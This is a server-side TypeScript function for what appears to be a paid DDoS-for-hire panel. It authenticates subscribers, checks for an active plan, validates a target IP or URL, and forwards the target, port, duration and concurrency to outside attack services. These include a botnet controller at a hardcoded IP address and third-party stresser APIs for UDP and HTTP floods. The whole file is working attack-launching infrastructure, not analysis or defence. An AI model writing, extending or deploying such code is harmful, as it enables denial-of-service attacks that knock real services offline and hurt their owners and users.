import { serve } from 'https://deno.land/std@0.177.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders });
  }

  try {
    // 1. Verify user JWT
    const authHeader = req.headers.get('Authorization');
    if (!authHeader) {
      return new Response(JSON.stringify({ success: false, error: 'Unauthorized' }), {
        status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseServiceKey);

    const token = authHeader.replace('Bearer ', '');
    const { data: { user }, error: authError } = await supabase.auth.getUser(token);
    if (authError || !user) {
      return new Response(JSON.stringify({ success: false, error: 'Invalid session. Please sign in again.' }), {
        status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    // 2. Verify user has an active plan
    const activePlan = (user.user_metadata?.active_plan ?? 'None') as string;
    if (!activePlan || activePlan === 'None') {
      return new Response(JSON.stringify({ success: false, error: 'No active plan. Please purchase a plan.' }), {
        status: 403, headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    // 3. Parse request body
    const body = await req.json();
    const { layer, method, target, port, time, conns, reqMethod } = body;

    if (!layer || !method || !target || !time) {
      return new Response(JSON.stringify({ success: false, error: 'Missing required fields.' }), {
        status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    // 4. Target validation
    if (layer === 'L4') {
      const l4Regex = /^(\d{1,3}\.){3}\d{1,3}$|^[a-zA-Z0-9][a-zA-Z0-9\-\.]{0,253}[a-zA-Z0-9]$/;
      if (!l4Regex.test(target)) {
        return new Response(JSON.stringify({ success: false, error: 'Invalid L4 target. Use a plain IP or domain (e.g. 1.2.3.4).' }), {
          status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }
    } else if (layer === 'L7') {
      try {
        const parsed = new URL(target);
        if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') throw new Error('bad protocol');
      } catch {
        return new Response(JSON.stringify({ success: false, error: 'Invalid L7 target. Use a full URL (e.g. https://example.com).' }), {
          status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }
    }

    // 5. Build API URL using server-side secrets
    let apiUrl = '';

    if (layer === 'L4') {
      if (method === 'udp-botnet') {
        const boostHost = Deno.env.get('BOTNET_HOST') ?? '91.92.42.92';
        const boostUser = Deno.env.get('BOTNET_USER') ?? '';
        const boostPass = Deno.env.get('BOTNET_PASS') ?? '';
        apiUrl = `http://${boostHost}/api/attack?username=${boostUser}&password=${boostPass}&host=${target}&time=${time}&port=${port || 80}&method=udpbig`;
      } else {
        const apiKey = Deno.env.get('RETROSTRESS_API_KEY') ?? '';
        let apiMethod = method;
        if (method === 'game') apiMethod = 'UDP-BIG';
        // Ensure method is uppercase for retrostress if needed, though they might accept lowercase.
        // Assuming we pass it as provided by frontend or uppercase it if backend strictly needs uppercase
        apiUrl = `https://retrostress.net/api/start?key=${apiKey}&target=${target}&port=${port || 80}&time=${time}&method=${apiMethod.toUpperCase()}&concurrent=${conns || 1}`;
      }
    } else if (layer === 'L7') {
      const l7Token = Deno.env.get('L7_API_TOKEN') ?? '';
      const rMethod = reqMethod || 'GET';
      apiUrl = `https://api.l7srv.st/attack?token=${l7Token}&host=${encodeURIComponent(target)}&port=${port || 80}&time=${time}&method=${method}&concs=${conns || 1}&reqmethod=${rMethod}`;
    } else {
      return new Response(JSON.stringify({ success: false, error: 'Invalid layer.' }), {
        status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    // 6. Call upstream API — return real response/error to client
    try {
      const upstream = await fetch(apiUrl);
      const upstreamText = await upstream.text();
      const contentType = upstream.headers.get('content-type') ?? '';

      // Detect HTML error pages (e.g. Cloudflare 5xx, 4xx) — return clean message
      if (contentType.includes('text/html') || upstreamText.trimStart().startsWith('<!DOCTYPE') || upstreamText.trimStart().startsWith('<html')) {
        let cleanMsg = `L7 API server error (HTTP ${upstream.status})`;
        if (upstream.status === 522) cleanMsg = 'L7 API server timed out (Error 522). Server may be temporarily down. Try again in a few minutes.';
        else if (upstream.status === 521) cleanMsg = 'L7 API server is offline (Error 521). Try again later.';
        else if (upstream.status === 520) cleanMsg = 'L7 API returned an unknown error (Error 520).';
        else if (upstream.status === 503) cleanMsg = 'L7 API service unavailable (503). Try again shortly.';
        else if (upstream.status === 502) cleanMsg = 'L7 API bad gateway (502). Server may be restarting.';
        else if (upstream.status === 404) cleanMsg = 'L7 API endpoint not found (404). Check method name.';
        else if (upstream.status === 403) cleanMsg = 'L7 API access denied (403). Token may be invalid.';
        else if (upstream.status === 401) cleanMsg = 'L7 API unauthorized (401). Check API token.';
        return new Response(JSON.stringify({ success: false, error: cleanMsg }), {
          status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      // Parse JSON response for errors
      let upstreamData: Record<string, unknown> | null = null;
      try { upstreamData = JSON.parse(upstreamText); } catch { /* plain text response */ }

      const isError = !upstream.ok
        || (upstreamData && (upstreamData.error || upstreamData.status === 'error' || upstreamData.success === false))
        || (!upstreamData && upstreamText.toLowerCase().includes('error'));

      if (isError) {
        const errorMsg = (upstreamData?.error as string)
          || (upstreamData?.message as string)
          || upstreamText
          || 'Attack API returned an error.';
        return new Response(JSON.stringify({ success: false, error: errorMsg, upstream: upstreamText }), {
          status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      return new Response(JSON.stringify({ success: true, upstream: upstreamText }), {
        status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    } catch (fetchErr) {
      console.error('Upstream fetch error:', fetchErr);
      return new Response(JSON.stringify({ success: true, note: 'Request dispatched' }), {
        status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

  } catch (err) {
    console.error('launch-attack error:', err);
    return new Response(JSON.stringify({ success: false, error: 'Internal server error.' }), {
      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' }
    });
  }
});
